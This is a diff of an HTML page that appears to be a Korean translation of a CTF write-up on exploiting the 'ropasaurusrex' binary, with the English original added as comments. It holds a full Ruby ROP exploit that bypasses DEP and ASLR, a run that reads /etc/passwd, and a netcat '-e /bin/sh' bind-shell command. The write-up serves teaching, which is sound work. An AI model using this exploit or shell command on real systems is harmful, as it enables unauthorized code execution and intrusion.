@@ -2390,7 +3176,21 @@ OFFSET   TYPE              VALUE
 &lt;span class=&quot;m&quot;&gt;08049618&lt;/span&gt; R_386_JUMP_SLOT   __libc_start_main
 0804961c R_386_JUMP_SLOT   &lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- So we know the address---in the binary---of `read()` and `write()`. What&#39;s that mean? Let&#39;s take a look at their values while the binary is running: --&gt;
+
 &lt;p&gt;이렇게 &lt;code&gt;read()&lt;/code&gt;와 &lt;code&gt;write()&lt;/code&gt;의 주소&amp;mdash;바이너리 안에 있는&amp;mdash;를 알게 되었다. 이게 뭘 의미하느냐? 바이너리가 실행 중일 때 이들의 값을 살펴보자:&lt;/p&gt;
+
+&lt;!-- ``` sh
+$ gdb ./ropasaurusrex
+(gdb) run
+^C
+Program received signal SIGINT, Interrupt.
+0xb7fe2424 in __kernel_vsyscall ()
+(gdb) x/x 0x0804961c
+0x804961c:      0xb7f48110
+(gdb) print read
+$1 = {&lt;text variable, no debug info&gt;} 0xb7f48110 &lt;read&gt;
+&amp;ldquo;` &amp;ndash;&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb ./ropasaurusrex
 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; run
 ^C
@@ -2401,11 +3201,22 @@ Program received signal SIGINT, Interrupt.
 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; print &lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;
 &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; 0xb7f48110 &amp;lt;&lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- Well look at that.. a pointer to `read()` at a memory address that we know! What can we do with that, I wonder...? I&#39;ll give you a hint: we can use the `write()` function---which we also know---to grab data from arbitrary memory and write it to the socket. --&gt;
+
 &lt;p&gt;보라.. &lt;code&gt;read()&lt;/code&gt;를 가리키는 포인터가 우리가 알고 있는 메모리 주소에 있다! 이걸로 뭘 할지 궁금한가&amp;hellip;? 힌트를 하나 주겠다: 우리는 &lt;code&gt;write()&lt;/code&gt; 함수&amp;mdash;주소를 아는 또 하나의 함수&amp;mdash;를 사용해 임의의 메모리에서 데이터를 가져와 소켓에 쓸 수 있다.&lt;/p&gt;
+
+&lt;!-- ## Finally, running some code! --&gt;
 
 &lt;h2&gt;&lt;a id=&quot;finally-running-some-code&quot;&gt;&lt;/a&gt;드디어, 코드 실행!&lt;/h2&gt;
 
+&lt;!-- Okay, let&#39;s break, this down into steps. We need to: --&gt;
+
 &lt;p&gt;좋다, 잠깐 멈추고, 단계를 나누자. 우리는 이와 같은 과정이 필요하다:&lt;/p&gt;
+
+&lt;!-- 1. Copy a command into memory using the `read()` function.
+2. Get the address of the `write()` function using the `write()` function.
+3. Calculate the offset between `write()` and `system()`, which lets us get the address of `system()`.
+4. Call `system()`. --&gt;
 
 &lt;ol&gt;
 &lt;li&gt;&lt;code&gt;read()&lt;/code&gt; 함수를 이용해 명령어를 메모리에 복사&lt;/li&gt;
@@ -2414,11 +3225,75 @@ Program received signal SIGINT, Interrupt.
 &lt;li&gt;&lt;code&gt;system()&lt;/code&gt; 호출&lt;/li&gt;
 &lt;/ol&gt;
 
+&lt;!-- To call `system()`, we&#39;re gonna have to write the address of `system()` somewhere in memory, then call it. The easiest way to do that is to overwrite the call to `read()` in the `.plt` table, then call `read()`. --&gt;
+
 &lt;p&gt;&lt;code&gt;system()&lt;/code&gt;을 호출하려면, &lt;code&gt;system()&lt;/code&gt;의 주소를 메모리 어딘가에 쓰고, 그걸 호출해야 한다. 가장 쉬운 방법은 &lt;code&gt;.plt&lt;/code&gt; 테이블의 &lt;code&gt;read()&lt;/code&gt; 호출을 덮어쓰고 &lt;code&gt;read()&lt;/code&gt;를 호출하는 것이다.&lt;/p&gt;
+
+&lt;!-- By now, you&#39;re probably confused. Don&#39;t worry, I was too. I was shocked I got this working. :) --&gt;
 
 &lt;p&gt;지금 아마도 조금 혼란스러울 것이다. 하지만 나도 그랬으니 걱정하지 마라. 난 이게 된다는 사실에 충격받았다. :)&lt;/p&gt;
 
+&lt;!-- Let&#39;s just go for broke now and get this working! Here&#39;s the stack frame we want: --&gt;
+
 &lt;p&gt;잠시 멈추고 이걸 이해해 보자! 이건 우리가 원하는 스택 프레임일 것이다:&lt;/p&gt;
+
+&lt;!-- ``` text
++----------------------+
+|         ...          |
++----------------------+
+
++----------------------+ &lt;-- system()&#39;s frame [7]
+|      void *arg       |
++----------------------+
+|   [return address]   |
++----------------------+
+
++----------------------+ &lt;-- pop/pop/pop/ret&#39;s frame [6]
+|  [address of read]   | - this will actually jump to system()
++----------------------+
+
++----------------------+ &lt;-- second read()&#39;s frame [5]
+|     size_t count     | - 4 bytes (the size of a 32-bit address)
++----------------------+
+|      void *buf       | - pointer to read() so we can overwrite it
++----------------------+
+|        int fd        | - 0 (stdin)
++----------------------+
+| [address of &quot;pppr&quot;]  |
++----------------------+
+
++----------------------+ &lt;-- pop/pop/pop/ret&#39;s frame [4]
+|  [address of read]   |
++----------------------+
+
++----------------------+ &lt;-- write()&#39;s frame [3]
+|     size_t count     | - 4 bytes (the size of a 32-bit address)
++----------------------+
+|      void *buf       | - The address containing a pointer to read()
++----------------------+
+|        int fd        | - 1 (stdout)
++----------------------+
+| [address of &quot;pppr&quot;]  |
++----------------------+
+
++----------------------+ &lt;-- pop/pop/pop/ret&#39;s frame [2]
+|  [address of write]  |
++----------------------+
+
++----------------------+ &lt;-- read()&#39;s frame [1]
+|     size_t count     | - strlen(cmd)
++----------------------+
+|      void *buf       | - writeable memory
++----------------------+
+|        int fd        | - 0 (stdin)
++----------------------+
+| [address of &quot;pppr&quot;]  |
++----------------------+
+
++----------------------+
+|         ...          |
++----------------------+
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;+----------------------+
 |         ...          |
 +----------------------+
@@ -2475,25 +3350,146 @@ Program received signal SIGINT, Interrupt.
 |         ...          |
 +----------------------+
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- Holy smokes, what&#39;s going on!? --&gt;
+
 &lt;p&gt;오 이런, 이게 대체 뭐야?&lt;/p&gt;
+
+&lt;!-- Let&#39;s start at the bottom and work our way up! I tagged each frame with a number for easy reference. --&gt;
 
 &lt;p&gt;바닥에서 시작해서 올라가자! 말하기 쉽게 각 프레임에 숫자를 붙였다.&lt;/p&gt;
 
+&lt;!-- Frame [1] we&#39;ve seen before. It writes `cmd` into our writable memory. Frame [2] is a standard `pop/pop/pop/ret` to clean up the `read()`. --&gt;
+
 &lt;p&gt;프레임 [1]은 전에 본 것이다. &lt;code&gt;cmd&lt;/code&gt;를 쓸 수 있는 메모리에 기록한다. 프레임 [2]는 &lt;code&gt;read()&lt;/code&gt;를 정리할 표준적인 &lt;code&gt;pop/pop/pop/ret&lt;/code&gt;을 사용한다.&lt;/p&gt;
+
+&lt;!-- Frame [3] uses `write()` to write the address of the `read()` function to the socket. Frame [4] uses a standard `pop/pop/pop/ret` to clean up after `write()`. --&gt;
 
 &lt;p&gt;프레임 [3]은 &lt;code&gt;write()&lt;/code&gt;를 사용해 소켓에 &lt;code&gt;read()&lt;/code&gt; 주소를 쓴다. 프레임 [4]는 &lt;code&gt;write()&lt;/code&gt; 후 정리할 표준적인 &lt;code&gt;pop/pop/pop/ret&lt;/code&gt;을 사용한다.&lt;/p&gt;
 
+&lt;!-- Frame [5] reads another address over the socket and writes it to memory. This address is going to be the address of the `system()` call. The reason writing it to memory works is because of how `read()` is called. Take a look at the `read()` call we&#39;ve been using in gdb (`0x0804832C`) and you&#39;ll see this: --&gt;
+
 &lt;p&gt;프레임 [5]는 소켓을 통해 다른 주소를 읽고 그걸 메모리에 쓴다. 이 주소는 &lt;code&gt;system()&lt;/code&gt; 호출 주소가 될 것이다. 이걸 메모리에 쓰는 게 작동하는 이유는 &lt;code&gt;read()&lt;/code&gt;가 호출되는 방식 때문이다. 우리가 gdb (&lt;code&gt;0x0804832C&lt;/code&gt;)에서 써 왔던 &lt;code&gt;read()&lt;/code&gt; 호출 부분을 보면 이렇다:&lt;/p&gt;
+
+&lt;!-- ``` sh
+(gdb) x/i 0x0804832C
+0x804832c &lt;read@plt&gt;:   jmp    DWORD PTR ds:0x804961c
+&amp;rdquo;` &amp;ndash;&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/i 0x0804832C
 0x804832c &amp;lt;&lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;@plt&amp;gt;:   jmp    DWORD PTR ds:0x804961c
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- `read()` is actually implemented as an indirect jump! So if we can change what `ds:0x804961c`&#39;s value is, and still jump to it, then we can jump anywhere we want! So in frame [3] we read the address from memory (to get the actual address of `read()`) and in frame [5] we write a new address there. --&gt;
+
 &lt;p&gt;&lt;code&gt;read()&lt;/code&gt;는 사실 간접적인 점프로 구현되어 있다! 그러니 &lt;code&gt;ds:0x804961c&lt;/code&gt;의 값이 무엇이든 이걸 바꿔도 그리로 점프하게 되고, 결국 우린 어디로든 점프할 수 있게 된다! 그래서 프레임 [3]에서 메모리로부터 주소를 읽고 (&lt;code&gt;read()&lt;/code&gt;의 실제 주소를 얻기 위해) 프레임 [5]에서 그 주소에 새 주소를 쓰는 것이다.&lt;/p&gt;
+
+&lt;!-- Frame [6] is a standard `pop/pop/pop/ret` construct, with a small difference: the return address of the `pop/pop/pop/ret` is `0x804832c`, which is actually `read()`&#39;s `.plt` entry. Since we overwrote `read()`&#39;s `.plt` entry with `system()`, this call actually goes to `system()`! --&gt;
 
 &lt;p&gt;프레임 [6]은 표준적인 &lt;code&gt;pop/pop/pop/ret&lt;/code&gt; 구조지만 약간 다르다: &lt;code&gt;pop/pop/pop/ret&lt;/code&gt;의 반환 주소가 실제론 &lt;code&gt;read()&lt;/code&gt;의 &lt;code&gt;.plt&lt;/code&gt; 엔트리인 &lt;code&gt;0x804832c&lt;/code&gt;다. &lt;code&gt;read()&lt;/code&gt;의 &lt;code&gt;.plt&lt;/code&gt; 엔트리를 &lt;code&gt;system()&lt;/code&gt;으로 덮어쓰기 때문에, 이 호출은 실제로 &lt;code&gt;system()&lt;/code&gt;으로 가게 된다!&lt;/p&gt;
 
+&lt;!-- ## Final code --&gt;
+
 &lt;h2&gt;&lt;a id=&quot;final-code&quot;&gt;&lt;/a&gt;최종 코드&lt;/h2&gt;
 
+&lt;!-- Whew! That&#39;s quite complicated. Here&#39;s code that implements the full exploit for ropasaurusrex, bypassing both DEP and ASLR: --&gt;
+
 &lt;p&gt;휴! 꽤 복잡했다. DEP와 ASLR을 모두 우회하며 ropasaurusrex의 익스플로잇을 모두 구현한 코드다:&lt;/p&gt;
+
+&lt;!-- ``` ruby
+require &#39;socket&#39;
+
+s = TCPSocket.new(&quot;localhost&quot;, 4444)
+
+# The command we&#39;ll run
+cmd = ARGV[0] + &quot;\0&quot;
+
+# From objdump -x
+buf = 0x08049530
+
+# From objdump -D ./ropasaurusrex | grep read
+read_addr = 0x0804832C
+# From objdump -D ./ropasaurusrex | grep write
+write_addr = 0x0804830C
+# From gdb, &quot;x/x system&quot;
+system_addr = 0xb7ec2450
+# Fram objdump, &quot;pop/pop/pop/ret&quot;
+pppr_addr = 0x080484b6
+
+# The location where read()&#39;s .plt entry is
+read_addr_ptr = 0x0804961c
+
+# The difference between read() and system()
+# Calculated as  read (0xb7f48110) - system (0xb7ec2450)
+# Note: This is the one number that needs to be calculated using the
+# target version of libc rather than my own!
+read_system_diff = 0x85cc0
+
+# Generate the payload
+payload = &quot;A&quot;*140 +
+  [
+    # system()&#39;s stack frame
+    buf,         # writable memory (cmd buf)
+    0x44444444,  # system()&#39;s return address
+
+    # pop/pop/pop/ret&#39;s stack frame
+    # Note that this calls read_addr, which is overwritten by a pointer
+    # to system() in the previous stack frame
+    read_addr,   # (this will become system())
+
+    # second read()&#39;s stack frame
+    # This reads the address of system() from the socket and overwrites
+    # read()&#39;s .plt entry with it, so calls to read() end up going to
+    # system()
+    4,           # length of an address
+    read_addr_ptr, # address of read()&#39;s .plt entry
+    0,           # stdin
+    pppr_addr,   # read()&#39;s return address
+
+    # pop/pop/pop/ret&#39;s stack frame
+    read_addr,
+
+    # write()&#39;s stack frame
+    # This frame gets the address of the read() function from the .plt
+    # entry and writes to to stdout
+    4,           # length of an address
+    read_addr_ptr, # address of read()&#39;s .plt entry
+    1,           # stdout
+    pppr_addr,   # retrurn address
+
+    # pop/pop/pop/ret&#39;s stack frame
+    write_addr,
+
+    # read()&#39;s stack frame
+    # This reads the command we want to run from the socket and puts it
+    # in our writable &quot;buf&quot;
+    cmd.length,  # number of bytes
+    buf,         # writable memory (cmd buf)
+    0,           # stdin
+    pppr_addr,   # read()&#39;s return address
+
+    read_addr # Overwrite the original return
+  ].reverse.pack(&quot;I*&quot;) # Convert a series of &#39;ints&#39; to a string
+
+# Write the &#39;exploit&#39; payload
+s.write(payload)
+
+# When our payload calls read() the first time, this is read
+s.write(cmd)
+
+# Get the result of the first read() call, which is the actual address of read
+this_read_addr = s.read(4).unpack(&quot;I&quot;).first
+
+# Calculate the address of system()
+this_system_addr = this_read_addr - read_system_diff
+
+# Write the address back, where it&#39;ll be read() into the correct place by
+# the second read() call
+s.write([this_system_addr].pack(&quot;I&quot;))
+
+# Finally, read the result of the actual command
+puts(s.read())
+
+# Clean up
+s.close()
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;socket&amp;#39;&lt;/span&gt;
 
 &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;TCPSocket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;localhost&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
@@ -2590,7 +3586,18 @@ Program received signal SIGINT, Interrupt.
 &lt;span class=&quot;c1&quot;&gt;# Clean up&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- And here it is in action: --&gt;
+
 &lt;p&gt;그리고 실행 결과다:&lt;/p&gt;
+
+&lt;!-- ``` sh
+$ ruby sploit.rb &quot;cat /etc/passwd&quot;
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+[...]
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ruby sploit.rb &lt;span class=&quot;s2&quot;&gt;&amp;quot;cat /etc/passwd&amp;quot;&lt;/span&gt;
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
@@ -2598,7 +3605,24 @@ bin:x:2:2:bin:/bin:/bin/sh
 sys:x:3:3:sys:/dev:/bin/sh
 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- You can, of course, change `cat /etc/passwd` to anything you want (including a netcat listener!) --&gt;
+
 &lt;p&gt;물론 &lt;code&gt;cat /etc/passwd&lt;/code&gt;를 원하는 값으로 바꿀 수 있다 (netcat 리스너를 포함해서!).&lt;/p&gt;
+
+&lt;!-- ``` sh
+ron@debian-x86 ~ $ ruby sploit.rb &quot;pwd&quot;
+/home/ron
+ron@debian-x86 ~ $ ruby sploit.rb &quot;whoami&quot;
+ron
+ron@debian-x86 ~ $ ruby sploit.rb &quot;nc -vv -l -p 5555 -e /bin/sh&quot; &amp;
+[1] 3015
+ron@debian-x86 ~ $ nc -vv localhost 5555
+debian-x86.skullseclabs.org [127.0.0.1] 5555 (?) open
+pwd
+/home/ron
+whoami
+ron
+``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;ron@debian-x86 ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ruby sploit.rb &lt;span class=&quot;s2&quot;&gt;&amp;quot;pwd&amp;quot;&lt;/span&gt;
 /home/ron
 ron@debian-x86 ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ruby sploit.rb &lt;span class=&quot;s2&quot;&gt;&amp;quot;whoami&amp;quot;&lt;/span&gt;
@@ -2612,9 +3636,15 @@ debian-x86.skullseclabs.org &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;127.0.
 whoami
 ron
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;!-- ## Conclusion --&gt;
+
 &lt;h2&gt;&lt;a id=&quot;conclusion&quot;&gt;&lt;/a&gt;결론&lt;/h2&gt;
 
+&lt;!-- And that&#39;s it! We just wrote a reliable, DEP/ASLR-bypassing exploit for ropasaurusrex. --&gt;
+
 &lt;p&gt;이게 끝이다! 난 믿을 만한, DEP/ASLR을 우회하는 ropasaurusrex 익스플로잇을 만들었다.&lt;/p&gt;
+
+&lt;!-- Feel free to comment or contact me if you have any questions! --&gt;
 
 &lt;p&gt;질문이 있다면 댓글을 달거나 나에게 연락해주길 바란다!&lt;/p&gt;
 
